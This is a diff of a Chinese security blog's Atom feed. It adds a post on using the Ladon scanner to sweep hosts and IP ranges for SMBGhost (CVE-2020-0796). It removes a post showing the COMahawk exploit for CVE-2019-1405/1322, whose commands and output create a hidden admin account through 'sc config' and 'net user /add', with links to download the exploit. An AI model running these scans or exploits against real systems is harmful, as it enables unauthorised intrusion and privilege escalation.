@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2020-06-03T14:33:47.740Z</updated>
+  <updated>2020-06-03T14:50:22.489Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,42 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Ladon SMBGhost CVE-2020-0796 RCE Vulnerable Scan</title>
+    <link href="http://k8gege.org/p/smbghost_cve_2020_0796.html"/>
+    <id>http://k8gege.org/p/smbghost_cve_2020_0796.html</id>
+    <published>2020-06-03T14:40:00.000Z</published>
+    <updated>2020-06-03T14:50:22.489Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><h3 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h3><p>漏洞编号：CVE-2020-0796<br>漏洞别名：SMBGhost</p><p>结果：IP、机器名、漏洞编号、操作系统版本</p><h3 id="扫描指定主机SMBGhost漏洞"><a href="#扫描指定主机SMBGhost漏洞" class="headerlink" title="扫描指定主机SMBGhost漏洞"></a>扫描指定主机SMBGhost漏洞</h3><p>Ladon 192.168.1.8 SMBGhost</p><h3 id="扫描C段主机SMBGhost漏洞"><a href="#扫描C段主机SMBGhost漏洞" class="headerlink" title="扫描C段主机SMBGhost漏洞"></a>扫描C段主机SMBGhost漏洞</h3><p>Ladon 192.168.1.8/24 SMBGhost<br>Ladon 192.168.1.8/C SMBGhost</p><h3 id="批量扫描IP列表主机SMBGhost漏洞"><a href="#批量扫描IP列表主机SMBGhost漏洞" class="headerlink" title="批量扫描IP列表主机SMBGhost漏洞"></a>批量扫描IP列表主机SMBGhost漏洞</h3><p>ip.txt里放需要扫描的IP，使用以下命令即可<br>Ladon SMBGhost</p><h3 id="扫描IP段（-24）列表主机SMBGhost漏洞"><a href="#扫描IP段（-24）列表主机SMBGhost漏洞" class="headerlink" title="扫描IP段（/24）列表主机SMBGhost漏洞"></a>扫描IP段（/24）列表主机SMBGhost漏洞</h3><p>ip24.txt里放需要扫描的IP段，使用以下命令即可<br>Ladon SMBGhost</p><h3 id="扫描IP段（-16）列表主机SMBGhost漏洞"><a href="#扫描IP段（-16）列表主机SMBGhost漏洞" class="headerlink" title="扫描IP段（/16）列表主机SMBGhost漏洞"></a>扫描IP段（/16）列表主机SMBGhost漏洞</h3><p>ip16.txt里放需要扫描的IP段，使用以下命令即可<br>Ladon SMBGhost</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/SmbGhost.PNG"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h3&gt;&lt;h3 id=&quot;模块说明&quot;&gt;&lt;a href=&quot;#模块说明&quot; class=&quot;headerlink&quot; title=&quot;模块说明&quot;&gt;&lt;/a
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+      <category term="Rce" scheme="http://k8gege.org/categories/Rce/"/>
+    
+      <category term="LPE" scheme="http://k8gege.org/categories/LPE/"/>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="Rce" scheme="http://k8gege.org/tags/Rce/"/>
+    
+      <category term="CVE-2020-0796" scheme="http://k8gege.org/tags/CVE-2020-0796/"/>
+    
+      <category term="SMBGhost" scheme="http://k8gege.org/tags/SMBGhost/"/>
+    
+  </entry>
   
   <entry>
     <title>Ladon大型内网渗透扫描器&amp;Cobalt Strike</title>
@@ -219,9 +255,9 @@
     
       <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
     
-      <category term="Brute" scheme="http://k8gege.org/categories/Brute/"/>
-    
       <category term="Rce" scheme="http://k8gege.org/categories/Rce/"/>
+    
+      <category term="Brute" scheme="http://k8gege.org/categories/Brute/"/>
     
     
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
@@ -601,38 +637,6 @@
       <category term=".NET" scheme="http://k8gege.org/tags/Dotnet/"/>
     
       <category term="SQL" scheme="http://k8gege.org/tags/SQL/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Windows提权工具 CVE-2019-1405 &amp; CVE-2019-1322</title>
-    <link href="http://k8gege.org/p/19321.html"/>
-    <id>http://k8gege.org/p/19321.html</id>
-    <published>2020-03-28T03:39:45.695Z</published>
-    <updated>2020-01-15T15:25:43.260Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>由NCC Group研究人员所发现的两个通过COM本地服务进行非法提权的漏洞。第一个漏洞CVE-2019-1405是COM服务中的一个逻辑错误，可让本地普通用户以LOCAL SERVICE身份执行任意命令。第二个漏洞CVE-2019-1322是一个简单的服务配置错误，可让本地SERVICE组中的任何用户重新配置以SYSTEM权限运行的服务（此漏洞也被其他研究人员发现）。当以上两个漏洞结合在一起时，就允许本地普通用户以SYSTEM权限执行任意命令。</p><p>全面检查了一些Windows服务,发现以LOCAL SERVICE或NETWORK SERVICE运行的所有用户都可以执行这种攻击。其中就包括前面我们提到的UPnP Device Host服务,这样我们就能以本地任意用户身份,结合使用CVE-2019-1405及CVE-2019-1322这两个漏洞,成功在Windows 10(1803到1903)系统上将权限提升至SYSTEM用户。</p><h3 id="漏洞版本"><a href="#漏洞版本" class="headerlink" title="漏洞版本"></a>漏洞版本</h3><p>Vendor     Product     Versions<br>Microsoft    Windows 10    -, 1607, 1709, 1803, 1809, 1903<br>Microsoft    Windows 7    -<br>Microsoft    Windows 8.1    -<br>Microsoft    Windows Rt 8.1    -<br>Microsoft    Windows Server 2008    -, R2<br>Microsoft    Windows Server 2012    -, R2<br>Microsoft    Windows Server 2016    -, 1803, 1903<br>Microsoft    Windows Server 2019    -</p><h3 id="默认提权"><a href="#默认提权" class="headerlink" title="默认提权"></a>默认提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe</span><br><span class="line">[\] Progress:  1/9 2/9 3/9 4/9 5/9 6/9 7/9 8/9 9/9</span><br><span class="line">[+] Hopefully k8gege:K8gege520 is added as an admin.</span><br><span class="line"></span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h3 id="指定命令"><a href="#指定命令" class="headerlink" title="指定命令"></a>指定命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe <span class="string">"net user k8gege K8gege123? /add"</span></span><br><span class="line">[+] Executing <span class="built_in">command</span> [ sc config UsoSvc binpath= <span class="string">"cmd.exe /c net user k8gege K8gege123? /add"</span> ]</span><br><span class="line">[\] Progress:  1/6 2/6 3/6 4/6 5/6 6/6</span><br><span class="line">[+] Command executed.</span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure><h3 id="Win10提权"><a href="#Win10提权" class="headerlink" title="Win10提权"></a>Win10提权</h3><p>Teston Win10 X64 1803<br><img data-original="http://k8gege.org/k8img/LPE/COMahawk.PNG"></p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p><a href="https://github.com/apt69/COMahawk" target="_blank" rel="noopener">https://github.com/apt69/COMahawk</a></p><p><a href="https://github.com/k8gege/K8tools/raw/master/Comahawk.rar" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/raw/master/Comahawk.rar</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h3&gt;&lt;p&gt;由NCC Group研究人员所发现的两个通过COM本地服务进行非法提权的漏洞。第一个漏洞CVE-2019-1405是COM服
-      
-    
-    </summary>
-    
-    
-      <category term="Exp" scheme="http://k8gege.org/categories/Exp/"/>
-    
-      <category term="提权" scheme="http://k8gege.org/categories/Lpe/"/>
-    
-    
-      <category term="Exp" scheme="http://k8gege.org/tags/Exp/"/>
-    
-      <category term="Tool" scheme="http://k8gege.org/tags/Tool/"/>
-    
-      <category term="LPE" scheme="http://k8gege.org/tags/LPE/"/>
     
   </entry>
   
